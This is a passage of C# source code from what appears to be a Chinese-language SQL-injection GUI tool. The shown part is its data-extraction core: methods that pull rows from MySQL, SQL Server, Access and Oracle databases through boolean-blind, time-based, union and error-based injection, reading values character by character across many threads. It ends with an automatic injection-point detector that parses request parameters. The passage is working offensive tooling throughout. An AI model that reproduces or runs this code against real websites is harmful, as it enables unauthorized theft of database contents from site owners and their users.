            }
            catch (Exception e)
            {
                this.Invoke(new StringDelegate(log), "获取值发生异常：" + e.Message);
            }
        }


        /// <summary>
        /// 获取数据
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByBoolBySQLServer(Object opam)
        {
            try
            {

                GetDataPam gp = (GetDataPam)opam;

                ListViewItem lvi = null;

                foreach (String columnName in gp.columns)
                {
                    //取每一列的值
                    String data_payload = MSSQL.getBoolDataPayLoad(columnName, gp.columns, gp.dbname, gp.table, gp.limit);
                    String payload_len = MSSQL.bool_length.Replace("{data}", data_payload).Replace("{columns}", columnName);

                    int len = getValueByStepUp(payload_len, 0, 50);

                    String value = "";
                    //获取值
                    for (int i = 1; i <= len; i++)
                    {
                        //取值payload，替换对应下标值
                        //select UNICODE(substring(@@version,{index},1))
                        //取值payload，替换对应下标值
                        String unicode_data_payload = MSSQL.unicode_value.Replace("{index}", i + "").Replace("{data}", data_payload);
                        //取unicode转换后的长度
                        String unicode_data_len_payload = MSSQL.bool_length.Replace("{data}", unicode_data_payload);

                        //长度范围2-8支持大部分语言
                        int unicode_data_len = getValue(unicode_data_len_payload, 1, 8);
                        int m_index = 1;
                        StringBuilder unicodes = new StringBuilder();
                        while (m_index <= unicode_data_len)
                        {
                            //获取多字节
                            String substr_payload = MSSQL.substr.Replace("{data}", unicode_data_payload).Replace("{index}", m_index.ToString());
                            //单个unicode值范围是0-9
                            int unicode = getValue(MSSQL.bool_value.Replace("{data}", substr_payload), 0, 9);
                            unicodes.Append(unicode.ToString());
                            m_index++;
                        }

                        if (Tools.convertToInt(unicodes.ToString()) > 255)
                        {
                            value += Tools.unHexByUnicode(int.Parse(unicodes.ToString()), config.db_encoding);
                        }
                        else
                        {
                            value += (char)Tools.convertToInt(unicodes.ToString());
                        }
                    }
                    if (lvi == null)
                    {
                        lvi = new ListViewItem(value);
                    }
                    else
                    {
                        lvi.SubItems.Add(value);
                    }

                }
                this.Invoke(new addItemToListViewDelegate(addItemToListView), lvi);
                this.Invoke(new StringDelegate(log), "获取到第" + gp.limit + "行的值！");

            }
            catch (Exception e)
            {
                this.Invoke(new StringDelegate(log), "获取值发生异常：" + e.Message);
            }
        }



        /// <summary>
        /// 获取数据
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByBoolByAccess(Object opam)
        {
            try
            {

                GetDataPam gp = (GetDataPam)opam;

                ListViewItem lvi = null;

                foreach (String columnName in gp.columns)
                {
                    //取每一列的值
                    String data_payload = Access.getBoolDataPayLoad(columnName, gp.columns, gp.dbname, gp.table, gp.limit);
                    String payload_len = Access.bool_length.Replace("{data}", data_payload).Replace("{columns}", columnName);

                    int len = getValueByStepUp(payload_len, 0, 50);

                    String value = "";
                    //获取值
                    for (int i = 1; i <= len; i++)
                    {
                        //asc有可能为负数，需要用65536减去这个数
                        String unicode_data_payload = Access.unicode_value.Replace("{index}", i + "").Replace("{data}", data_payload);
                        //取unicode转换后的长度
                        String unicode_data_len_payload = Access.bool_length.Replace("{data}", unicode_data_payload);

                        //长度范围2-8支持大部分语言
                        int unicode_data_len = getValue(unicode_data_len_payload, 1, 8);
                        int m_index = 1;
                        StringBuilder unicodes = new StringBuilder();
                        while (m_index <= unicode_data_len)
                        {
                            //获取多字节
                            String substr_payload = Access.substr.Replace("{data}", unicode_data_payload).Replace("{index}", m_index.ToString());
                            //单个unicode值范围是0-9
                            int unicode = getValue(Access.bool_value.Replace("{data}", substr_payload), 0, 9);
                            unicodes.Append(unicode.ToString());
                            m_index++;
                        }
                        if (unicodes.ToString().StartsWith("0") && unicodes.Length > 1)
                        {
                            unicodes.Remove(0, 1);
                            unicodes.Insert(0, "-");
                        }


                        int strnum = Tools.convertToInt(unicodes.ToString());
                        if (strnum < 0)
                        {
                            strnum = 65536 + strnum;

                        }
                        value += Tools.unHexByUnicode(strnum, config.db_encoding);
                    }
                    if (lvi == null)
                    {
                        lvi = new ListViewItem(value);
                    }
                    else
                    {
                        lvi.SubItems.Add(value);
                    }

                }
                this.Invoke(new addItemToListViewDelegate(addItemToListView), lvi);
                this.Invoke(new StringDelegate(log), "获取到第" + gp.limit + "行的值！");

            }
            catch (Exception e)
            {
                this.Invoke(new StringDelegate(log), "获取值发生异常：" + e.Message);
            }
        }

        /// <summary>
        /// 获取数据
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByBoolByOracle(Object opam)
        {
            try
            {

                GetDataPam gp = (GetDataPam)opam;

                ListViewItem lvi = null;

                foreach (String columnName in gp.columns)
                {
                    //取每一列的值
                    String data_payload = Oracle.getBoolDataPayLoad(columnName, gp.columns[0], gp.dbname, gp.table, gp.limit);
                    String payload_len = Oracle.bool_length.Replace("{data}", data_payload).Replace("{column}", columnName);

                    int len = getValueByStepUp(payload_len, 0, 50);

                    String value = "";
                    //获取值
                    for (int i = 1; i <= len; i++)
                    {
                        //取值payload，替换对应下标值
                        //select UNICODE(substring(@@version,{index},1))
                        //取值payload，替换对应下标值
                        String hex_data_payload = Oracle.hex_value.Replace("{index}", i + "").Replace("{data}", data_payload);
                        //取unicode转换后的长度
                        String hex_data_len_payload = Oracle.bool_length.Replace("{data}", hex_data_payload);

                        //长度范围2-8支持大部分语言
                        int unicode_data_len = getValue(hex_data_len_payload, 1, 8);
                        int m_index = 1;
                        StringBuilder hexs = new StringBuilder();
                        while (m_index <= unicode_data_len)
                        {
                            //获取多字节
                            String substr_payload = Oracle.bool_value.Replace("{data}", hex_data_payload).Replace("{index}", m_index.ToString());
                            //单个unicode值范围是0-9
                            int ascii = getValue(substr_payload, 0, 255);
                            hexs.Append((char)ascii);
                            m_index++;
                        }
                        value += Tools.hexToRaw(hexs.ToString(), config.db_encoding);

                    }
                    if (lvi == null)
                    {
                        lvi = new ListViewItem(value);
                    }
                    else
                    {
                        lvi.SubItems.Add(value);
                    }

                }
                this.Invoke(new addItemToListViewDelegate(addItemToListView), lvi);
                this.Invoke(new StringDelegate(log), "获取到第" + gp.limit + "行的值！");

            }
            catch (Exception e)
            {
                this.Invoke(new StringDelegate(log), "获取值发生异常：" + e.Message);
            }
        }

        /// <summary>
        /// 获取数据，union方式
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByUnionByMySQL(Object opam)
        {
            try
            {

                GetDataPam gp = (GetDataPam)opam;
                String datas_value_payload = MySQL5.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, "1", gp.columns, gp.table, gp.dbname, gp.limit);
                String result = getOneDataByUnionOrError(MySQL5.union_value.Replace("{data}", datas_value_payload));

                this.Invoke(new StringDelegate(log), "报告大侠，获取到第" + (gp.limit + 1) + "行数据");
                String[] datas = Regex.Split(result, "\\$\\$\\$");
                addItemToListView(datas);

            }
            catch (Exception e)
            {
                this.Invoke(new StringDelegate(log), "获取值发生异常：" + e.Message);
            }
        }


        /// <summary>
        /// 获取数据，union方式
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByUnionBySQLServer(Object opam)
        {
            try
            {
                GetDataPam gp = (GetDataPam)opam;
                ListViewItem lvi = new ListViewItem();
                String result = getOneDataByUnionOrError(MSSQL.getUnionDataValue(config.columnsCount, config.showColumn, 1, gp.dbname, gp.table, gp.columns, gp.limit));
                this.Invoke(new addItemToListViewByColumnsDelegate(addItemToListViewByColumns), result);
                this.Invoke(new StringDelegate(log), "获取到第" + gp.limit + "行的值！");
            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取值发生异常：" + e.Message);
            }
        }

        /// <summary>
        /// 获取数据，union方式
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByUnionByAccess(Object opam)
        {
            try
            {
                GetDataPam gp = (GetDataPam)opam;
                ListViewItem lvi = new ListViewItem();
                String result = getOneDataByUnionOrError(Access.getUnionDataValue(config.columnsCount, config.showColumn, gp.columns, gp.table, gp.limit.ToString()).Replace("{table}", this.curren_table));
                this.Invoke(new addItemToListViewByColumnsDelegate(addItemToListViewByColumns), result);
                this.Invoke(new StringDelegate(log), "获取到第" + gp.limit + "行的值！");
            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取值发生异常：" + e.Message);
            }
        }

        /// <summary>
        /// 获取数据，union方式
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByUnionByOracle(Object opam)
        {
            try
            {
                GetDataPam gp = (GetDataPam)opam;
                ListViewItem lvi = new ListViewItem();
                String result = getOneDataByUnionOrError(Oracle.getUnionDataValue(config.columnsCount, config.showColumn, gp.columns, gp.dbname, gp.table, gp.limit.ToString()));
                this.Invoke(new addItemToListViewByColumnsDelegate(addItemToListViewByColumns), result);
                this.Invoke(new StringDelegate(log), "获取到第" + gp.limit + "行的值！");
            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取值发生异常：" + e.Message);
            }
        }

        public void addItemToListView(String[] columnsValue)
        {

            ListViewItem lvi = null;
            foreach (String d in columnsValue)
            {
                if (lvi == null)
                {
                    lvi = new ListViewItem(d);
                }
                else
                {
                    lvi.SubItems.Add(d);
                }
            }
            if (lvi != null)
            {
                this.Invoke(new addItemToListViewDelegate(addItemToListView), lvi);
            }
        }

        /// <summary>
        /// 获取数据MySQL，error方式,这个长度有限，需要判断是否大于错误消息的长度限制是64个
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByErrorByMySQL(Object opam)
        {
            try
            {
                GetDataPam gp = (GetDataPam)opam;

                ListViewItem lvi = null;
                foreach (String column in gp.columns)
                {
                    //获取数据长度

                    String datas_payload_columns = MySQL5.creatMySQLColumnStr(column);
                    String datas_payload_length = MySQL5.char_length.Replace("{data}", "(select " + datas_payload_columns + " from " + gp.dbname + "." + gp.table + " limit " + gp.limit + ",1)");

                    String d_l_e = MySQL5.creatMySQLColumnStr("(" + datas_payload_length + ")");
                    String datas_payload_length_error = MySQL5.error_value.Replace("{data}", d_l_e);

                    String result_length = getOneDataByUnionOrError(datas_payload_length_error);

                    int sumlen = Tools.convertToInt(result_length);
                    String datas_value_payload = "(select " + MySQL5.creatMySQLColumnsStrByError(column, gp.table, gp.dbname, gp.limit) + ")";
                    String result = "";
                    int start = 1;
                    //每次获取长度，err方式有长度限制
                    int count = 64 - 6;
                    this.Invoke(new StringDelegate(log), "报告大侠，正在获取数据，每次请求将获取" + count + "字符！");
                    while (start < sumlen)
                    {
                        //hex编码，防止中文等乱码
                        String datas_value_column = MySQL5.substr_value.Replace("{data}", datas_value_payload).Replace("{start}", start.ToString()).Replace("{len}", count.ToString());
                        String c_datas_value_payload = MySQL5.error_value.Replace("{data}", datas_value_column);
                        result += getOneDataByUnionOrError(c_datas_value_payload);
                        start += count;
                    }
                    if (lvi == null)
                    {
                        lvi = new ListViewItem(result);
                    }
                    else
                    {
                        lvi.SubItems.Add(result);
                    }

                }
                this.Invoke(new addItemToListViewDelegate(addItemToListView), lvi);
                this.Invoke(new StringDelegate(log), "获取到第" + (gp.limit + 1) + "行的值！");
            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取值发生异常：" + e.Message);
            }

        }

        /// <summary>
        /// 获取数据SQLServer，error方式,这个长度有限，需要判断是否大于错误消息的长度限制是64个
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByErrorBySQLServer(Object opam)
        {
            try
            {
                GetDataPam gp = (GetDataPam)opam;
                ListViewItem lvi = new ListViewItem();
                String result = getOneDataByUnionOrError(MSSQL.getErrorDataValue(gp.dbname, gp.table, gp.limit, gp.columns));
                this.Invoke(new addItemToListViewByColumnsDelegate(addItemToListViewByColumns), result);
                this.Invoke(new StringDelegate(log), "获取到第" + gp.limit + "行的值！");
            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取值发生异常：" + e.Message);
            }

        }

        /// <summary>
        /// 获取数据oracle，error方式,这个长度有限，需要判断是否大于错误消息的长度限制是256个
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByErrorByOracle(Object opam)
        {
            try
            {
                GetDataPam gp = (GetDataPam)opam;
                ListViewItem lvi = new ListViewItem();
                String datas_len_payload = Oracle.getErrorDataLen(gp.columns, gp.dbname, gp.table, gp.limit.ToString());
                String result_length = getOneHexDataByUnionOrError(Oracle.error_value.Replace("{data}", datas_len_payload));

                int sumlen = Tools.convertToInt(result_length);
                String result = "";
                int start = 1;
                //每次获取长度，err方式有长度限制
                int count = 205;
                if (count < 1)
                {

                    this.Invoke(new StringDelegate(log), "报告大侠，选择的列太多了，无法获取数据！");
                    return;
                }
                this.Invoke(new StringDelegate(log), "报告大侠，正在获取数据，每次请求将获取" + count + "个hex字符！");
                while (start < sumlen)
                {
                    //hex编码，防止中文等乱码
                    String tmp_data_payload = Oracle.getDataValue(gp.columns, gp.dbname, gp.table, gp.limit.ToString());
                    String err_tmp_data_payload = Oracle.substr_error_value.Replace("{data}", tmp_data_payload).Replace("{start}", start.ToString()).Replace("{len}", count.ToString());
                    result += getOneHexNoUnHexDataByUnionOrError(err_tmp_data_payload);
                    start += count;
                }

                result = Tools.unHex(result, config.db_encoding);

                this.Invoke(new addItemToListViewByColumnsDelegate(addItemToListViewByColumns), result);
                this.Invoke(new StringDelegate(log), "获取到第" + gp.limit + "行的值！");
            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取值发生异常：" + e.Message);
            }
            /*
            try
            {
                GetDataPam gp = (GetDataPam)opam;

                ListViewItem lvi = null;
                foreach (String column in gp.columns)
                {
                    //获取数据长度

                    String datas_payload_columns = Tools.creatMySQLColumnStr(column);
                    String datas_payload_length = MySQL5.char_length.Replace("{data}", "hex(" + datas_payload_columns) + ") from " + gp.dbname + "." + gp.table + " limit " + gp.limit + ",1";

                    String d_l_e = Tools.creatMySQLColumnStr("(" + datas_payload_length + ")");
                    String datas_payload_length_error = MySQL5.error_value.Replace("{data}", d_l_e);

                    String result_length = getOneDataByUnionOrError(datas_payload_length_error);

                    int sumlen = Tools.convertToInt(result_length);
                    String datas_value_payload = "(select " + Tools.creatMySQLColumnsStrByError(column, gp.table, gp.dbname, gp.limit) + ")";
                    String result = "";
                    int start = 1;
                    //每次获取长度，err方式有长度限制
                    int count = 64 - 6;
                    this.Invoke(new StringDelegate(log), "报告大侠，正在获取数据，每次请求将获取" + count + "字符！");
                    while (start < sumlen)
                    {
                        //hex编码，防止中文等乱码
                        String datas_value_column = Tools.creatMySQLColumnStr(MySQL5.substr_value.Replace("{data}", MySQL5.hex_value.Replace("{data}", datas_value_payload)).Replace("{start}", start.ToString()).Replace("{len}", count.ToString()));
                        String c_datas_value_payload = MySQL5.error_value.Replace("{data}", datas_value_column);
                        result += getOneDataByUnionOrError(c_datas_value_payload);
                        start += count;
                    }
                    //查找格式^^^col$$$col^^^
                    result = Tools.unHex(result, config.db_encoding);
                    Match m = Regex.Match(result, "(?<=(\\^\\^\\!))[.\\s\\S]*?(?=(\\!\\^\\^))");
                    if (m.Success)
                    {
                        result = m.Value;
                    }

                    if (lvi == null)
                    {
                        lvi = new ListViewItem(result);
                    }
                    else
                    {
                        lvi.SubItems.Add(result);
                    }

                }
                this.Invoke(new addItemToListViewDelegate(addItemToListView), lvi);
                this.Invoke(new StringDelegate(log), "获取到第" + gp.limit + "行的值！");
            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取值发生异常：" + e.Message);
            }*/

        }



        public void getDatasByBool(DBType dbtype, List<String> columns, int start, int dataCount)
        {
            bool isMax = false;
            switch (dbtype)
            {

                case DBType.Access:
                    isMax = findKeyInBody(Access.bool_datas_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table), dataCount);
                    if (isMax)
                    {
                        //下标从1开始
                        for (int i = 1; i <= dataCount; i++)
                        {
                            GetDataPam gd = new GetDataPam();
                            gd.columns = columns;
                            gd.dbname = this.curren_db;
                            gd.table = this.curren_table;
                            gd.limit = start + i;
                            gd.isMuStr = config.isMuStr;
                            MyThreadPool.initThread(new ParameterizedThreadStart(getDataValueByBoolByAccess), gd);
                        }
                    }
                    else
                    {

                        MessageBox.Show("没有这么多行数据，改小点，2B！");
                    }
                    break;
                case DBType.MySQL4:

                    break;
                case DBType.MySQL5:

                    if (config.keyType.Equals(KeyType.Time))
                    {
                        isMax = findKeyInBody(MySQL5.getBoolCountBySleep(MySQL5.data_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table), config.maxTime), (start + dataCount));
                    }
                    else
                    {
                        isMax = findKeyInBody(MySQL5.bool_datas_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table), (start + dataCount));
                    }

                    if (isMax)
                    {
                        for (int i = 0; i < dataCount; i++)
                        {
                            GetDataPam gd = new GetDataPam();
                            gd.columns = columns;
                            gd.dbname = this.curren_db;
                            gd.table = this.curren_table;
                            gd.limit = start + i;
                            gd.isMuStr = config.isMuStr;
                            MyThreadPool.initThread(new ParameterizedThreadStart(getDataValueByBoolByMySQL), gd);
                        }
                    }
                    else
                    {

                        MessageBox.Show("没有这么多行数据，改小点，2B！");
                    }

                    break;
                case DBType.SQLServer:
                    isMax = findKeyInBody(MSSQL.bool_datas_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table), dataCount);
                    if (isMax)
                    {
                        //下标从1开始
                        for (int i = 1; i <= dataCount; i++)
                        {
                            GetDataPam gd = new GetDataPam();
                            gd.columns = columns;
                            gd.dbname = this.curren_db;
                            gd.table = this.curren_table;
                            gd.limit = start + i;
                            gd.isMuStr = config.isMuStr;
                            MyThreadPool.initThread(new ParameterizedThreadStart(getDataValueByBoolBySQLServer), gd);
                        }
                    }
                    else
                    {
                        MessageBox.Show("没有这么多行数据，改小点，2B！");
                    }

                    break;
                case DBType.Oracle:
                    isMax = findKeyInBody(Oracle.bool_datas_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table), dataCount);
                    if (isMax)
                    {
                        for (int i = 1; i <= dataCount; i++)
                        {
                            GetDataPam gd = new GetDataPam();
                            gd.columns = columns;
                            gd.dbname = this.curren_db;
                            gd.table = this.curren_table;
                            gd.limit = start + i;
                            gd.isMuStr = config.isMuStr;
                            MyThreadPool.initThread(new ParameterizedThreadStart(getDataValueByBoolByOracle), gd);
                        }
                    }
                    else
                    {

                        MessageBox.Show("没有这么多行数据，改小点，2B！");
                    }
                    break;
            }

        }


        public void getDatasByError(DBType dbtype, List<String> columns, int start, int dataCount)
        {
            List<String> data_list = new List<String>();
            String datas_count_payload = "";
            String result = "";
            int datas_count = 0;
            switch (dbtype)
            {

                case DBType.Access:
                    MessageBox.Show(ErrorMessage.access_no_error_inject_info);
                    break;
                case DBType.MySQL4:
                    MessageBox.Show(ErrorMessage.mysql4_no_error_inject_info);
                    break;
                case DBType.MySQL5:

                    data_list.Add(MySQL5.data_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table));
                    datas_count_payload = MySQL5.creatMySQLColumnsStrByError(data_list, null, null, -1);
                    result = getOneDataByUnionOrError(MySQL5.error_value.Replace("{data}", datas_count_payload));

                    this.Invoke(new StringDelegate(log), "报告大侠，表" + this.curren_table + "有" + Tools.convertToInt(result) + "行数据！");

                    datas_count = Tools.convertToInt(result);
                    this.dataCount = datas_count;
                    if (datas_count < (dataCount + start))
                    {
                        this.Invoke(new StringDelegate(log), "大侠，表" + this.curren_table + "只有" + Tools.convertToInt(result) + "行数据，你需要获取的数据没有这么多呀！");
                        this.data_dbs_txt_count.Text = this.dataCount.ToString();
                        break;
                    }

                    for (int i = 0; i < dataCount; i++)
                    {
                        GetDataPam gd = new GetDataPam();
                        gd.columns = columns;
                        gd.dbname = this.curren_db;
                        gd.table = this.curren_table;
                        gd.limit = start + i;
                        gd.isMuStr = config.isMuStr;
                        MyThreadPool.initThread(new ParameterizedThreadStart(getDataValueByErrorByMySQL), gd);
                    }
                    break;
                case DBType.SQLServer:
                    result = getOneDataByUnionOrError(MSSQL.error_value.Replace("{data}", MSSQL.data_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table)));
                    //HTML解码
                    result = HttpUtility.HtmlDecode(result);
                    this.Invoke(new StringDelegate(log), "报告大侠，表" + this.curren_table + "有" + Tools.convertToInt(result) + "行数据！");

                    datas_count = Tools.convertToInt(result);
                    this.dataCount = datas_count;
                    if (datas_count < (dataCount + start))
                    {
                        this.Invoke(new StringDelegate(log), "大侠，表" + this.curren_table + "只有" + Tools.convertToInt(result) + "行数据，你需要获取的数据没有这么多呀！");
                        this.data_dbs_txt_count.Text = this.dataCount.ToString();
                        break;
                    }
                    //注意下标从1开始
                    for (int i = 1; i <= dataCount; i++)
                    {
                        GetDataPam gd = new GetDataPam();
                        gd.columns = columns;
                        gd.dbname = this.curren_db;
                        gd.table = this.curren_table;
                        gd.limit = start + i;
                        gd.isMuStr = config.isMuStr;
                        //按照一行的一列一列开始获取
                        MyThreadPool.initThread(new ParameterizedThreadStart(getDataValueByErrorBySQLServer), gd);
                    }
                    break;
                case DBType.Oracle:
                    result = getOneHexDataByUnionOrError(Oracle.getErrorDataValue(Oracle.union_data_count, this.curren_db, this.curren_table, ""));

                    this.Invoke(new StringDelegate(log), "报告大侠，表" + this.curren_table + "有" + Tools.convertToInt(result) + "行数据！");

                    datas_count = Tools.convertToInt(result);
                    this.dataCount = datas_count;
                    if (datas_count < (dataCount + start))
                    {
                        this.Invoke(new StringDelegate(log), "大侠，表" + this.curren_table + "只有" + Tools.convertToInt(result) + "行数据，你需要获取的数据没有这么多呀！");
                        this.data_dbs_txt_count.Text = this.dataCount.ToString();
                        break;
                    }
                    //注意下标从1开始
                    for (int i = 1; i <= dataCount; i++)
                    {
                        GetDataPam gd = new GetDataPam();
                        gd.columns = columns;
                        gd.dbname = this.curren_db;
                        gd.table = this.curren_table;
                        gd.limit = start + i;
                        gd.isMuStr = config.isMuStr;
                        //按照一行的一列一列开始获取
                        MyThreadPool.initThread(new ParameterizedThreadStart(getDataValueByErrorByOracle), gd);
                    }
                    break;
            }

        }


        public void getDatasByUnion(DBType dbtype, List<String> columns, int start, int dataCount)
        {
            List<String> data_list = new List<String>();
            String datas_count_payload = "";
            String result = "";

            int datas_count = 0;
            switch (dbtype)
            {

                case DBType.Access:

                    datas_count_payload = Access.getUnionDataValue(config.columnsCount, config.showColumn, 1, Access.data_count.Replace("{table}", this.curren_table)).Replace("{table}", this.curren_table);
                    result = getOneDataByUnionOrError(datas_count_payload);

                    this.Invoke(new StringDelegate(log), "报告大侠，表" + this.curren_table + "有" + Tools.convertToInt(result) + "行数据！");

                    datas_count = Tools.convertToInt(result);
                    this.dataCount = datas_count;
                    if (datas_count < (dataCount + start))
                    {
                        this.Invoke(new StringDelegate(log), "大侠，表" + this.curren_table + "只有" + Tools.convertToInt(result) + "行数据，你需要获取的数据没有这么多呀！");
                        this.data_dbs_txt_count.Text = this.dataCount.ToString();
                        break;
                    }
                    //下标从1开始
                    for (int i = 1; i <= dataCount; i++)
                    {
                        GetDataPam gd = new GetDataPam();
                        gd.columns = columns;
                        gd.dbname = this.curren_db;
                        gd.table = this.curren_table;
                        gd.limit = start + i;
                        gd.isMuStr = config.isMuStr;
                        MyThreadPool.initThread(new ParameterizedThreadStart(getDataValueByUnionByAccess), gd);
                    }
                    break;
                case DBType.MySQL4:

                    break;
                case DBType.MySQL5:
                    data_list.Add(MySQL5.data_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table));
                    datas_count_payload = MySQL5.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, "1", data_list, null, null, -1);
                    result = getOneDataByUnionOrError(MySQL5.union_value.Replace("{data}", datas_count_payload));

                    this.Invoke(new StringDelegate(log), "报告大侠，表" + this.curren_table + "有" + Tools.convertToInt(result) + "行数据！");

                    datas_count = Tools.convertToInt(result);
                    this.dataCount = datas_count;
                    if (datas_count < (dataCount + start))
                    {
                        this.Invoke(new StringDelegate(log), "大侠，表" + this.curren_table + "只有" + Tools.convertToInt(result) + "行数据，你需要获取的数据没有这么多呀！");
                        this.data_dbs_txt_count.Text = this.dataCount.ToString();
                        break;
                    }

                    for (int i = 0; i < dataCount; i++)
                    {
                        GetDataPam gd = new GetDataPam();
                        gd.columns = columns;
                        gd.dbname = this.curren_db;
                        gd.table = this.curren_table;
                        gd.limit = start + i;
                        gd.isMuStr = config.isMuStr;
                        MyThreadPool.initThread(new ParameterizedThreadStart(getDataValueByUnionByMySQL), gd);
                    }
                    break;
                case DBType.SQLServer:

                    datas_count_payload = MSSQL.getUnionDataValue(config.columnsCount, config.showColumn, 1, MSSQL.data_count, this.curren_db, this.curren_table, "");
                    result = getOneDataByUnionOrError(datas_count_payload);

                    this.Invoke(new StringDelegate(log), "报告大侠，表" + this.curren_table + "有" + Tools.convertToInt(result) + "行数据！");

                    datas_count = Tools.convertToInt(result);
                    this.dataCount = datas_count;
                    if (datas_count < (dataCount + start))
                    {
                        this.Invoke(new StringDelegate(log), "大侠，表" + this.curren_table + "只有" + Tools.convertToInt(result) + "行数据，你需要获取的数据没有这么多呀！");
                        this.data_dbs_txt_count.Text = this.dataCount.ToString();
                        break;
                    }
                    //下标从1开始
                    for (int i = 1; i <= dataCount; i++)
                    {
                        GetDataPam gd = new GetDataPam();
                        gd.columns = columns;
                        gd.dbname = this.curren_db;
                        gd.table = this.curren_table;
                        gd.limit = start + i;
                        gd.isMuStr = config.isMuStr;
                        MyThreadPool.initThread(new ParameterizedThreadStart(getDataValueByUnionBySQLServer), gd);
                    }
                    break;
                case DBType.Oracle:
                    datas_count_payload = Oracle.getUnionDataValue(config.columnsCount, config.showColumn, Oracle.union_data_count, this.curren_db, this.curren_table, "");
                    result = getOneDataByUnionOrError(datas_count_payload);

                    this.Invoke(new StringDelegate(log), "报告大侠，表" + this.curren_table + "有" + Tools.convertToInt(result) + "行数据！");

                    datas_count = Tools.convertToInt(result);
                    this.dataCount = datas_count;
                    if (datas_count < (dataCount + start))
                    {
                        this.Invoke(new StringDelegate(log), "大侠，表" + this.curren_table + "只有" + Tools.convertToInt(result) + "行数据，你需要获取的数据没有这么多呀！");
                        this.data_dbs_txt_count.Text = this.dataCount.ToString();
                        break;
                    }
                    //下标从1开始
                    for (int i = 1; i <= dataCount; i++)
                    {
                        GetDataPam gd = new GetDataPam();
                        gd.columns = columns;
                        gd.dbname = this.curren_db;
                        gd.table = this.curren_table;
                        gd.limit = start + i;
                        gd.isMuStr = config.isMuStr;
                        MyThreadPool.initThread(new ParameterizedThreadStart(getDataValueByUnionByOracle), gd);
                    }
                    break;
            }

        }

        public void getData(Object ocolumns_list)
        {

            int count = Tools.convertToInt(this.data_dbs_txt_count.Text);
            int start = Tools.convertToInt(this.data_dbs_txt_start.Text);
            if (count <= 0 || start < 0 || start + count <= 0)
            {
                MessageBox.Show("大哥，您在忽悠我吗，要获取多少行数据啊？");
                return;
            }
            //多线程 
            List<String> col_list = (List<String>)ocolumns_list;

            if (col_list.Count > 0)
            {
                switch (config.injectType)
                {
                    case InjectType.Bool:
                        getDatasByBool(config.dbType, col_list, start, count);
                        break;

                    case InjectType.Union:

                        getDatasByUnion(config.dbType, col_list, start, count);
                        break;
                    case InjectType.Error:
                        getDatasByError(config.dbType, col_list, start, count);
                        break;
                    case InjectType.Sleep:
                        getDatasByUnion(config.dbType, col_list, start, count);
                        break;
                }
            }
            else
            {

                MessageBox.Show("请在左边点击选择列！");
            }
        }


        private void log_lvw_httpLog_MouseClick(object sender, MouseEventArgs e)
        {
            if (this.log_lvw_httpLog.SelectedItems.Count > 0)
            {
                try
                {
                    String tag = this.log_lvw_httpLog.SelectedItems[0].Tag.ToString();
                    this.log_txt_request.Text = FileTool.readFileToString(Tools.httpLogPath + tag + "-request.txt");
                    String response = FileTool.readFileToString(Tools.httpLogPath + tag + "-response.txt");
                    if (!String.IsNullOrEmpty(response))
                    {
                        int index = response.IndexOf("\r\n\r\n");

                        if (index != -1)
                        {
                            this.log_txt_response.Text = response;
                            this.webBro_log.ScriptErrorsSuppressed = true;
                            this.webBro_log.DocumentText = response.Substring(index, response.Length - index);
                        }


                    }
                    else
                    {
                        MessageBox.Show("没有读到详细HTTP日志，可能上一次清除记录时已清除！");
                    }
                }
                catch (Exception ee)
                {
                    Tools.SysLog("查看详细HTTP日志，发生异常----" + ee.Message);
                }
            }
        }

        private void data_cms_clearLog_Click(object sender, EventArgs e)
        {
            Thread t = new Thread(Tools.delHTTPLog);
            t.Start();
            this.log_lvw_httpLog.Items.Clear();

        }
        public int autoinject = 0;
        public Thread injectThread = null;
        private void btn_autoInject_Click(object sender, EventArgs e)
        {

            if (autoinject == 0)
            {
                if (config.request.IndexOf("#inject#") != -1)
                {
                    MessageBox.Show("已经标记好注入，无需识别！");
                    return;
                }
                autoinject = 1;
                injectThread = new Thread(inject);
                injectThread.Name = "AutoCheckInjectThread-";
                injectThread.Start();
                this.btn_autoInject.Text = "停止";
               
            }
            else
            {
                if (injectThread != null)
                {
                    injectThread.Abort();
                }
                this.btn_autoInject.Text = "自动识别";
                autoinject = 0;
            }
        }

        public void inject()
        {
            try
            {
                selectInjectType(0);
                selectDB("UnKnow");
                //判断提交数据内型
                String data = "";
                if (config.request.StartsWith("GET"))
                {
                    int start = config.request.IndexOf('?');
                    if (start == -1)
                    {
                        MessageBox.Show("没有发现参数！");
                        return;
                    }
                    int end = config.request.IndexOf(' ', start);
                    if (end > start)
                    {

                        data = config.request.Substring(start + 1, end - start - 1);
                    }
                    else
                    {
                        MessageBox.Show("无法获得GET请求的参数！");
                    }

                }
                else
                {
                    //POST
                    data = Regex.Split(config.request, "\r\n\r\n")[1];

                }

